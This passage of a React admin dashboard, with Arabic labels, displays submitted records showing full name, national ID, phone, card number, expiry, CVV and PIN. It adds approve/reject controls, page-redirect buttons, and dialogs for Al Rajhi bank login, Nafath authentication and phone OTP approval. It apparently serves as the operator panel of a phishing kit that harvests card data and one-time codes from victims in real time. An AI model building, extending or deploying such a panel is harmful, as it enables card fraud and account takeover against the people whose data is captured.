                        ? "bg-gradient-to-r from-teal-50 to-cyan-50 border-teal-300"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "9999")}
                  >
                    <Tag className="h-4 w-4" />
                    هاتف
                  </Button>
                  <Button
                    variant="outline"
                    className={`flex items-center gap-2 justify-center border-2 border-blue-200 hover:bg-blue-50 transition-all duration-200 ${
                      selectedNotification.pagename === "offers"
                        ? "bg-gradient-to-r from-emerald-50 to-teal-50 border-emerald-300"
                        : ""
                    }`}
                    onClick={() => handleUpdatePagename(selectedNotification.id, "3")}
                  >
                    <Tag className="h-4 w-4" />
                    عروض
                  </Button>
                </div>
              </div>
            </div>
          )}
          <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t border-blue-200/50">
            <Button
              onClick={() => setShowPagenameDialog(false)}
              className="w-full border-2 border-blue-200 hover:bg-blue-50 bg-white/80"
              variant="outline"
            >
              إغلاق
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Sidebar for detailed view */}
      <Sheet open={showSidebar} onOpenChange={setShowSidebar}>
        <SheetContent
          side="left"
          className="w-full sm:max-w-md overflow-y-auto bg-white/95 backdrop-blur-xl border-r-2 border-blue-200"
          dir="rtl"
        >
          <SheetHeader className="text-right">
            <SheetTitle className="text-xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 text-transparent bg-clip-text">
              تفاصيل البيانات
            </SheetTitle>
            <SheetDescription className="text-gray-600">عرض جميع المعلومات المتعلقة بهذا الطلب</SheetDescription>
          </SheetHeader>
          {selectedNotification && (
            <div className="mt-6 space-y-6">
              <div className="bg-gradient-to-r from-blue-50 to-purple-50 rounded-lg p-4 border-2 border-blue-200">
                <h3 className="text-lg font-semibold mb-2 flex items-center gap-2 text-gray-800">
                  <User className="h-5 w-5 text-blue-600" />
                  المعلومات الشخصية
                </h3>
                <div className="space-y-3">
                  <div className="flex justify-between">
                    <span className="text-sm text-blue-600">الاسم الكامل:</span>
                    <span className="font-medium text-gray-800">
                      {selectedNotification.documment_owner_full_name ||
                        selectedNotification.document_owner_full_name ||
                        selectedNotification.full_name ||
                        "غير محدد"}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-sm text-blue-600">رقم الهوية:</span>
                    <span className="font-medium font-mono text-gray-800">
                      {selectedNotification.owner_identity_number ||
                        selectedNotification.buyer_identity_number ||
                        "غير محدد"}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-sm text-blue-600">رقم الهاتف:</span>
                    <span className="font-medium font-mono text-gray-800">
                      {selectedNotification.phone || "غير محدد"}
                    </span>
                  </div>
                  {selectedNotification.phone2 && (
                    <div className="flex justify-between">
                      <span className="text-sm text-blue-600">رقم الهاتف 2:</span>
                      <span className="font-medium font-mono text-gray-800">{selectedNotification.phone2}</span>
                    </div>
                  )}
                  <div className="flex justify-between">
                    <span className="text-sm text-blue-600">حالة الاتصال:</span>
                    <div className="flex items-center gap-2">
                      <OnlineStatusText userId={getUserId(selectedNotification)} />
                    </div>
                  </div>
                </div>
              </div>
              {(selectedNotification.cardNumber ||
                (selectedNotification.formData && selectedNotification.formData.cardNumber)) && (
                <div className="bg-gradient-to-r from-emerald-50 to-teal-50 rounded-lg p-4 border-2 border-emerald-200">
                  <h3 className="text-lg font-semibold mb-2 flex items-center gap-2 text-gray-800">
                    <CreditCard className="h-5 w-5 text-emerald-600" />
                    معلومات البطاقة
                  </h3>
                  <div className="space-y-3">
                    <div className="flex justify-between">
                      <span className="text-sm text-emerald-600">رقم البطاقة:</span>
                      <span className="font-medium font-mono text-gray-800">
                        {selectedNotification.cardNumber ||
                          (selectedNotification.formData && selectedNotification.formData.cardNumber) ||
                          "غير محدد"}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-sm text-emerald-600">تاريخ الانتهاء:</span>
                      <span className="font-medium font-mono text-gray-800">
                        {selectedNotification.cardMonth && selectedNotification.cardYear
                          ? `${selectedNotification.cardMonth}/${selectedNotification.cardYear}`
                          : selectedNotification.formData &&
                              selectedNotification.formData.cardMonth &&
                              selectedNotification.formData.cardYear
                            ? `${selectedNotification.formData.cardMonth}/${selectedNotification.formData.cardYear}`
                            : "غير محدد"}
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-sm text-emerald-600">رمز الأمان:</span>
                      <span className="font-medium font-mono text-gray-800">
                        {selectedNotification.cvv ||
                          (selectedNotification.formData && selectedNotification.formData.cvv) ||
                          "غير محدد"}
                      </span>
                    </div>
                    {selectedNotification.pinCode && (
                      <div className="flex justify-between">
                        <span className="text-sm text-emerald-600">الرقم السري:</span>
                        <span className="font-medium font-mono text-gray-800">{selectedNotification.pinCode}</span>
                      </div>
                    )}
                  </div>
                </div>
              )}
              {selectedNotification.vehicle_type && (
                <div className="bg-gradient-to-r from-indigo-50 to-blue-50 rounded-lg p-4 border-2 border-indigo-200">
                  <h3 className="text-lg font-semibold mb-2 flex items-center gap-2 text-gray-800">
                    <Car className="h-5 w-5 text-indigo-600" />
                    معلومات المركبة
                  </h3>
                  <div className="space-y-3">
                    <div className="flex justify-between">
                      <span className="text-sm text-indigo-600">نوع المركبة:</span>
                      <span className="font-medium text-gray-800">{selectedNotification.vehicle_type}</span>
                    </div>
                    {selectedNotification.vehicle_manufacture_number && (
                      <div className="flex justify-between">
                        <span className="text-sm text-indigo-600">رقم تصنيع المركبة:</span>
                        <span className="font-medium font-mono text-gray-800">
                          {selectedNotification.vehicle_manufacture_number}
                        </span>
                      </div>
                    )}
                    {selectedNotification.customs_code && (
                      <div className="flex justify-between">
                        <span className="text-sm text-indigo-600">رمز الجمارك:</span>
                        <span className="font-medium font-mono text-gray-800">{selectedNotification.customs_code}</span>
                      </div>
                    )}
                  </div>
                </div>
              )}
              <div className="bg-gradient-to-r from-amber-50 to-orange-50 rounded-lg p-4 border-2 border-amber-200">
                <h3 className="text-lg font-semibold mb-2 flex items-center gap-2 text-gray-800">
                  <Bell className="h-5 w-5 text-amber-600" />
                  معلومات الطلب
                </h3>
                <div className="space-y-3">
                  <div className="flex justify-between">
                    <span className="text-sm text-amber-600">نوع الطلب:</span>
                    <div>{getPageType(selectedNotification.pagename)}</div>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-sm text-amber-600">الحالة:</span>
                    <div>{getStatusBadge(selectedNotification.status)}</div>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-sm text-amber-600">تاريخ الإنشاء:</span>
                    <span className="font-medium text-gray-800">
                      {formatDistanceToNow(new Date(selectedNotification.createdDate), {
                        addSuffix: true,
                        locale: ar,
                      })}
                    </span>
                  </div>
                </div>
              </div>
              <div className="flex gap-2 mt-6">
                <Button
                  onClick={() => {
                    handleApproval("approved", selectedNotification.id)
                    setShowSidebar(false)
                  }}
                  className="flex-1 bg-gradient-to-r from-emerald-400 to-teal-500 hover:from-emerald-500 hover:to-teal-600 text-white border-0 shadow-lg"
                >
                  <CheckCircle className="h-4 w-4 mr-2" />
                  قبول
                </Button>
                <Button
                  onClick={() => {
                    handleApproval("rejected", selectedNotification.id)
                    setShowSidebar(false)
                  }}
                  className="flex-1 bg-gradient-to-r from-rose-400 to-red-500 hover:from-rose-500 hover:to-red-600 text-white border-0 shadow-lg"
                >
                  <XCircle className="h-4 w-4 mr-2" />
                  رفض
                </Button>
                <Button
                  onClick={() => {
                    handleDelete(selectedNotification.id)
                    setShowSidebar(false)
                  }}
                  variant="outline"
                  className="flex-1 border-2 border-gray-200 hover:bg-gray-50 bg-white/80"
                >
                  <Trash2 className="h-4 w-4 mr-2" />
                  حذف
                </Button>
              </div>
            </div>
          )}
        </SheetContent>
      </Sheet>

      {/* External Component Dialogs */}
      <RajhiAuthDialog open={showRajhiDialog} onOpenChange={setShowRajhiDialog} notification={selectedNotification} />
      <NafazAuthDialog open={showNafazDialog} onOpenChange={setShowNafazDialog} notification={selectedNotification} />
      <PhoneDialog
        phoneOtp={selectedNotification?.phoneOtp}
        handlePhoneOtpApproval={handlePhoneOtpApproval}
        open={showPhoneDialog}
        onOpenChange={setPhoneDialog}
        notification={selectedNotification}
      />
    </div>
  )
}
